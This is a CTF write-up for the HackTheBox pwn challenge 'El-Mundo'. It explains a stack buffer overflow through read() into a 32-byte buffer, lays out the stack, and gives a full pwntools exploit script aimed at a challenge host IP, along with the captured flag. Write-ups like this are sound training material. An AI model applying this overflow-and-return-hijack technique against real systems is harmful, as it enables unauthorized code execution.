---
title: "El-Mundo"
ctf: "HTB"
date: 2026-06-11
category: pwn
difficulty: easy
points: N/A
flag_format: "HTB{...}"
author: "gluppler"
---

# El-Mundo

## Summary

Stack buffer overflow via `read()` into a 32-byte buffer. A size check (`cmpq $0x37, nbytes; jg success`) requires sending more than 55 bytes. Overflow overwrites the return address with `ret_gadget` + `read_flag` to print the flag.

## Solution

### Step 1: Stack layout

Buffer at `rbp-0x30` (32 bytes), `nbytes` at `rbp-0x08`, saved rbp at `rbp`, return address at `rbp+8`. Padding: 48 bytes to reach saved rbp.

### Step 2: Exploit

No PIE, no canary — addresses are known at compile time. Send 48 bytes padding + 8 bytes fake rbp + `ret` gadget (0x40101a, for 16-byte stack alignment) + `read_flag` (0x4016b7).

```python
from pwn import *

context.arch = 'amd64'
io = remote('154.57.164.74', 31097)

read_flag = 0x4016b7
ret_gadget = 0x40101a

payload = b'A' * 48 + b'B' * 8 + p64(ret_gadget) + p64(read_flag)
io.recvuntil(b'> ')
io.sendline(payload)
print(io.recvall(timeout=5).decode(errors='ignore'))
```

## Flag

```
HTB{z4_sp00ky_w4rud0o0o0o0}
```
